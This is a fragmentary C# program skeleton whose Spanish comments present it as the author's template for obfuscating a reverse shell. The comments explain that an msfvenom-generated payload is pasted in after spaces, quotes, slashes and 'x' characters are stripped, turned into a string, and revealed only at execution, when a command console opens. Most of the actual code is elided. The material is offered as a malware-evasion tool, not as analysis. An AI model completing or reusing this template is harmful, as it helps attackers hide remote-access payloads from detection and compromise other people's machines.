/* eEsta es una plantilla que tengo para ofuscar reverse shell la cual en simples palabras transforma el virus en string y luego cuando es su ejecucion llega a mostrar lo que es realidad */
using System;
...

{
    class Program 
    {
        ...
        {
            /* Aqui es donde debe de ir nuestro payload previamente creado por msfvenom se deben de remplazar ciertas cosas tales como espacios,comillas y /, posterior se quitan tambien las x todo esto se puede hacer facil con macros */ 
            ...
            /*Aqui es simple la instruccion dice que abrira una consola de comandos que muestre lo que esta entre comillas*/
